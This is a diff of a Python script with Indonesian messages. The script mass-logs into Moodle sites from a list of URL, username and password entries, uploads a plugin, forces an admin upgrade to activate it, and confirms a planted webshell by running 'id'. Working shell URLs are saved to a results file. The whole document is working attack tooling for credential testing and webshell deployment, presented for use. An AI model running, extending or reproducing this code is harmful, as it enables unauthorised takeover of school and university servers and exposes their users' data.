@@ -2,7 +2,7 @@ import requests
 import re
 import os
 import argparse
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urljoin
 from concurrent.futures import ThreadPoolExecutor
 
 requests.packages.urllib3.disable_warnings()
@@ -20,18 +20,36 @@ def get_login_token(session, url):
     except:
         return None
 
+def auto_upgrade_if_needed(session, base_url):
+    try:
+        upgrade_url = urljoin(base_url, "/admin/index.php")
+        r = session.get(upgrade_url, timeout=15, verify=False)
+
+        if 'upgrade' in r.text.lower() or 'continue' in r.text.lower():
+            sesskey = re.findall(r'name="sesskey" value="(.*?)"', r.text)
+            if sesskey:
+                sesskey = sesskey[0]
+                confirm_data = {
+                    'confirmupgrade': '1',
+                    'confirmrelease': '1',
+                    'sesskey': sesskey
+                }
+                session.post(upgrade_url, data=confirm_data, verify=False, timeout=20)
+    except:
+        pass
+
 def check_plugins_page(session, base_url):
     try:
         plugins_url = urljoin(base_url, "/admin/plugins.php")
-        r = session.get(plugins_url, timeout=15, verify=False, allow_redirects=True)
-        return "plugin" in r.text.lower() and "moodle" in r.text.lower()
+        r = session.get(plugins_url, timeout=15, verify=False)
+        return "plugin" in r.text.lower()
     except:
         return False
 
 def check_webshell(session, base_url):
     try:
         shell_url = urljoin(base_url, "/local/moodle_webshell/webshell.php?action=exec&cmd=id")
-        r = session.get(shell_url, timeout=15, verify=False, allow_redirects=True)
+        r = session.get(shell_url, timeout=15, verify=False)
         return "uid=" in r.text
     except:
         return False
@@ -52,14 +70,13 @@ def process(line):
         }
 
         base_url = url.split("/login")[0]
-        login = session.post(url, data=login_data, verify=False, timeout=15, allow_redirects=True)
+        login = session.post(url, data=login_data, verify=False, timeout=15, allow_redirects=False)
 
-        if login.url.endswith("/my/") or login.status_code in [200, 303]:
+        if login.status_code == 303 and "MOODLEID1_=deleted" in login.headers.get("Set-Cookie", ""):
             save_result("login_success.txt", line)
 
-            # STEP: Upload plugin
             install_url = urljoin(base_url, "/admin/tool/installaddon/index.php")
-            r = session.get(install_url, timeout=15, verify=False, allow_redirects=True)
+            r = session.get(install_url, timeout=15, verify=False)
             sesskey = re.findall(r'name="sesskey" value="(.*?)"', r.text)
             if not sesskey:
                 return
@@ -81,24 +98,19 @@ def process(line):
                 files=files,
                 data=data,
                 verify=False,
-                timeout=20,
-                allow_redirects=True
+                timeout=20
             )
 
             if "url" in upload.text:
                 save_result("upload_success.txt", line)
+                auto_upgrade_if_needed(session, base_url)
 
-                # Cek plugin halaman
                 if check_plugins_page(session, base_url):
                     save_result("upload_success_checked.txt", f"{url}|{username}|{password}")
-
-                    # Cek shell aktif
                     if check_webshell(session, base_url):
-                        shell_link = urljoin(base_url, "/local/moodle_webshell/webshell.php")
-                        save_result("webshell_live.txt", shell_link)
-
-    except Exception as e:
-        pass  # Bisa tambahkan logging di sini kalau mau debug
+                        save_result("webshell_live.txt", f"{base_url}/local/moodle_webshell/webshell.php")
+    except:
+        pass
 
 def main():
     parser = argparse.ArgumentParser()
@@ -112,7 +124,7 @@ def main():
     with ThreadPoolExecutor(max_workers=args.thread) as exe:
         exe.map(process, lines)
 
-    print("\n✅ UPLOAD DONE. Cek folder 'result' untuk hasil:")
+    print("\nUPLOAD DONE. Cek folder 'result' untuk hasil berikut:")
     print("- login_success.txt")
     print("- upload_success.txt")
     print("- upload_success_checked.txt")
